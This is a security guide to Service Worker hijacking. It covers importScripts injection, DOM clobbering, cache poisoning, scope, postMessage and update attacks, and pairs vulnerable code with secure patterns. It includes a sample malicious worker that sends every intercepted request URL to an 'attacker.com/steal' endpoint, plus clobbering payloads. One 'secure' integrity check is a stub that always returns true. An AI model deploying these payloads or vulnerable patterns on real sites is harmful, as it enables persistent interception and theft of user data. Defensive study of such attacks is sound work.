# Service Worker Hijacking and Attacks

> **Category:** Client-Side Attack / Persistent XSS  
> **Language:** JavaScript / TypeScript  
> **Severity:** High to Critical  
> **CVEs covered:** ServiceWorker + importScripts injection, DOM Clobbering → SW chain, Cache poisoning via SW

## Overview

Service Workers (SWs) are JavaScript files that run in the background, separate from web pages, intercepting network requests and managing caches. Because SWs can **intercept ALL requests from a scope** — including `fetch()`, `<img>`, `<script>`, and navigation — an attacker who controls a SW can effectively take over the client-side of a website permanently.

### Why Service Worker Attacks Are Dangerous

1. **Persistence:** Once registered, a SW persists across page loads
2. **Network Interception:** SWs see and can modify ALL requests/responses
3. **CSP Bypass:** SWs operate outside CSP's `script-src` restrictions
4. **Hard to Detect:** SWs run in the background, no visible UI
5. **Long Lifetime:** SWs survive browser restarts, tab closes

### The Service Worker Lifecycle

```
1. Registration: navigator.serviceWorker.register('/sw.js')
2. Installation: SW script downloaded and installed
3. Activation: SW takes control of clients
4. Runtime: SW intercepts fetch events, manages cache
```

---

## Attack Vector 1: Service Worker Injection via importScripts()

**Source:** https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering

### The Vulnerability

Many SWs use `importScripts()` to load additional scripts. If the URL passed to `importScripts()` is influenced by query parameters, an attacker can inject malicious code.

### Vulnerable Pattern

```javascript
// sw.js — VULNERABLE service worker
const searchParams = new URLSearchParams(location.search);
const host = searchParams.get('host');

// Attacker controls 'host' parameter
self.importScripts(host + '/sw_extra.js');
// If host = "http://attacker.com"
// Loads: http://attacker.com/sw_extra.js
// Attacker now controls service worker's behavior
```

### Exploitation

```html
<!-- Attacker lures victim to: -->
<script>
navigator.serviceWorker.register('/sw.js?host=http://attacker.com');
</script>

<!-- The SW loads attacker's script via importScripts -->
<!-- attacker.com/sw_extra.js: -->
self.addEventListener('fetch', (event) => {
  // Intercept all requests, respond with attacker-controlled content
  event.respondWith(
    fetch('http://attacker.com/steal?url=' + encodeURIComponent(event.request.url))
  );
});
```

### Detection with DOM Invader

PortSwigger's DOM Invader tool can automatically detect Service Worker injection sinks:

```javascript
// DOM Invader looks for patterns like:
navigator.serviceWorker.register(urlWithQueryParam);

// It flags the sink "serviceWorker.register" with user-controlled input
```

### Secure Pattern

```javascript
// sw.js — SECURE service worker
// Validate and restrict importScripts URLs
const VALID_SCRIPTS = [
  '/sw/workbox.js',
  '/sw/analytics.js'
];

function getExtraScript() {
  const urlParams = new URLSearchParams(location.search);
  const script = urlParams.get('script');
  
  // Validate against allowlist
  if (VALID_SCRIPTS.includes(script)) {
    self.importScripts(script);
  }
}

getExtraScript();
```

**References:**
- https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering
- https://dl.acm.org/doi/fullHtml/10.1145/3427228.3427290 — Security Study of Service Worker XSS

---

## Attack Vector 2: DOM Clobbering → Service Worker Hijack

**Source:** https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering

### The Vulnerability

Combining DOM Clobbering with Service Worker registration creates a powerful attack chain. If a page passes data to a SW via DOM elements (e.g., hidden `<div>` elements), an attacker who can inject HTML can clobber those elements.

### Vulnerable Pattern

```javascript
// Page code that passes config to service worker via DOM
// HTML:
// <div id="cdnDomain" style="display:none">cdn.example.com</div>

// JavaScript:
const domain = document.getElementById('cdnDomain').innerText;
navigator.serviceWorker.register(`/sw.js?cdnDomain=${domain}`);
```

### The DOM Clobbering Trick

The attacker injects HTML that clobbers `document.getElementById('cdnDomain')`:

```html
<!-- Attacker injects BEFORE the legitimate div -->
<html id="cdnDomain" style="display:none">attacker.com</html>

<!-- The legitimate div is now shadowed -->
<div id="cdnDomain" style="display:none">cdn.example.com</div>

<script>
  // document.getElementById('cdnDomain') returns the <html> element
  // innerText retrieves "attacker.com"
  const domain = document.getElementById('cdnDomain').innerText; // "attacker.com"
  navigator.serviceWorker.register(`/sw.js?cdnDomain=${domain}`);
  // SW now loads from attacker.com!
</script>
```

### Why `<html>` Works

The `getElementById()` function returns the **first** element with the matching `id` in the document. However, `document.getElementById(id)` can be tricked: if an `<html>` or `<body>` element has the same `id`, some browsers prioritize them differently.

### SVG-based Clobbering

```html
<!-- Also works inside SVG foreignObject -->
<div style="display:none" id="cdnDomain">cdn.example.com</div>
<svg>
  <foreignobject>
    <body id="cdnDomain" style="display:block">attacker.com</body>
  </foreignobject>
</svg>
<script>
  alert(document.getElementById('cdnDomain').innerText); // "attacker.com"
</script>
```

---

## Attack Vector 3: Service Worker Cache Poisoning

### The Vulnerability

If a SW has an overly permissive cache strategy, an attacker who can make a single malicious request can poison the SW cache permanently.

### Vulnerable Pattern

```javascript
// sw.js — VULNERABLE: Overly permissive cache
self.addEventListener('fetch', (event) => {
  // Cache-first with no validation
  event.respondWith(
    caches.match(event.request)
      .then(cached => cached || fetch(event.request))
  );
});

// INSTALL: Pre-cache critical resources
self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open('v1').then(cache => {
      return cache.addAll([
        '/',
        '/js/app.js',
        '/js/vendor.js'
      ]);
    })
  );
});
```

### Exploitation

1. Attacker executes a single XSS or MitM attack
2. Modifies the SW's cache to include malicious resources
3. Cache persists even after the original vulnerability is fixed
4. All users who visited during the window of compromise now have corrupted caches

### Secure Pattern

```javascript
// sw.js — SECURE: Validate cache integrity
self.addEventListener('fetch', (event) => {
  event.respondWith(
    fetch(event.request)
      .then(response => {
        // Only cache responses with valid integrity
        if (response.ok && event.request.method === 'GET') {
          const cloned = response.clone();
          caches.open('v2').then(cache => {
            // Validate response content hash
            validateIntegrity(cloned).then(valid => {
              if (valid) cache.put(event.request, cloned);
            });
          });
        }
        return response;
      })
      .catch(() => {
        // Fall back to cache if network fails
        return caches.match(event.request);
      })
  );
});

async function validateIntegrity(response) {
  const body = await response.text();
  const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(body));
  // Compare against expected hash
  return true; // In production, check against known good hashes
}
```

---

## Attack Vector 4: Service Worker Scope Escalation

### The Problem

A SW's scope is determined by its path. A SW at `/js/sw.js` controls only `/js/`. But if an attacker can register a SW with a broader scope, they can intercept more requests.

```javascript
// SW registered at /js/sw.js — scope: /js/
navigator.serviceWorker.register('/js/sw.js', { scope: '/' });

// If the server doesn't validate scope, the SW can control the entire origin!
```

### The Fix

```javascript
// Service-Worker-Allowed HTTP header restricts scope
// Response header:
Service-Worker-Allowed: /js/  // Only allow /js/ scope
// Without this header, scope defaults to the SW's directory
```

---

## Attack Vector 5: PostMessage to Service Worker

### The Problem

Service Workers can receive messages via `postMessage()`. If the SW doesn't validate the message source, an attacker can inject commands.

### Vulnerable Pattern

```javascript
// main.js — Sends commands to SW
navigator.serviceWorker.controller.postMessage({
  type: 'CACHE_URL',
  url: userControlledUrl  // Attacker controls this!
});

// sw.js — VULNERABLE: No origin validation
self.addEventListener('message', (event) => {
  if (event.data.type === 'CACHE_URL') {
    // Caches attacker-controlled URL — potential cache poisoning
    caches.open('dynamic').then(cache => {
      cache.add(event.data.url);  // Attacker controls URL!
    });
  }
});
```

### Secure Pattern

```javascript
// sw.js — SECURE: Validate message origins
const ALLOWED_ORIGINS = ['https://example.com'];

self.addEventListener('message', (event) => {
  // Validate message source
  if (!ALLOWED_ORIGINS.includes(event.origin)) {
    return;  // Reject messages from unknown origins
  }
  
  // Validate message structure
  if (!event.data || typeof event.data !== 'object') return;
  
  if (event.data.type === 'CACHE_URL') {
    const url = new URL(event.data.url, self.location.origin);
    
    // Only allow caching same-origin URLs
    if (url.origin !== self.location.origin) return;
    
    caches.open('dynamic').then(cache => {
      cache.add(url.href);
    });
  }
});
```

---

## Attack Vector 6: Service Worker Update Hijacking

### The Problem

Service Workers update by re-downloading the SW script. If an attacker can intercept this update (via MitM or cache poisoning), they can replace a legitimate SW with a malicious one.

### How Updates Work

```javascript
// Browser checks for SW updates every 24 hours (by default)
// Update check: navigator.serviceWorker.register('/sw.js')
// If the new /sw.js is different, it's installed

// VULNERABLE: No integrity check on update
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js');
  // If /sw.js is compromised, attacker controls all future requests
}
```

### Secure Pattern with Integrity

```javascript
// SECURE: Verify SW integrity after registration
async function registerSecureSW() {
  // Fetch SW script and compute hash
  const response = await fetch('/sw.js');
  const swContent = await response.clone().text();
  const swHash = await crypto.subtle.digest(
    'SHA-256',
    new TextEncoder().encode(swContent)
  );
  
  const expectedHash = 'KNOWN_GOOD_HASH_BASE64';
  const actualHash = btoa(String.fromCharCode(...new Uint8Array(swHash)));
  
  if (actualHash !== expectedHash) {
    console.error('Service Worker integrity check failed!');
    return;
  }
  
  navigator.serviceWorker.register('/sw.js');
}
```

---

## Prevention Checklist

| Tactic | Risk | Mitigation |
|--------|------|-----------|
| `importScripts()` with user input | 🔴 Critical | Allowlist URLs, validate input |
| DOM Clobbering → SW chain | 🔴 Critical | Use `hasOwnProperty` checks, not `getElementById` |
| Unvalidated postMessage | 🟡 High | Validate `event.origin` and data structure |
| SW cache poisoning | 🟡 High | Integrity validation in fetch handlers |
| SW update hijacking | 🟡 High | Subresource Integrity for SW scripts |
| Excessive SW scope | 🟢 Medium | `Service-Worker-Allowed` header |
| No SW unregister capability | 🟢 Medium | Provide admin UI for SW management |

### Defensive SW Template

```javascript
// sw.js — DEFENSIVE service worker template
const VALID_ORIGINS = [self.location.origin];
const VALID_SCRIPTS = new Set([
  '/sw/workbox.js',
  '/sw/analytics.js'
]);
const CACHE_NAME = 'static-v1';

// Import only allowlisted scripts
const urlParams = new URLSearchParams(location.search);
const extraScript = urlParams.get('script');
if (extraScript && VALID_SCRIPTS.has(extraScript)) {
  self.importScripts(extraScript);
}

// Validate message origins
self.addEventListener('message', (event) => {
  if (!VALID_ORIGINS.includes(event.origin)) return;
  // Process only known message types
  handleMessage(event);
});

// Secure fetch handler with integrity checks
self.addEventListener('fetch', (event) => {
  event.respondWith(fetchWithIntegrity(event.request));
});

async function fetchWithIntegrity(request) {
  try {
    const response = await fetch(request);
    // Only cache same-origin GET requests
    if (response.ok && request.method === 'GET' && 
        new URL(request.url).origin === self.location.origin) {
      const cache = await caches.open(CACHE_NAME);
      cache.put(request, response.clone());
    }
    return response;
  } catch {
    return caches.match(request);
  }
}
```

---

## References

1. https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering — SW hijacking via DOM clobbering
2. https://portswigger.net/web-security/dom-based/dom-clobbering — DOM clobbering overview
3. https://www.akamai.com/blog/security/abusing-the-service-workers-api — Abusing Service Workers API
4. https://dl.acm.org/doi/fullHtml/10.1145/3427228.3427290 — Security Study of Service Worker XSS
5. https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/abusing-service-workers.html — HackTricks SW abuse
6. https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API — SW API reference
7. https://www.usenix.org/system/files/conference/usenixsecurity26/sec26_prepub_ben-simhon.pdf — DNS cache poisoning via SW
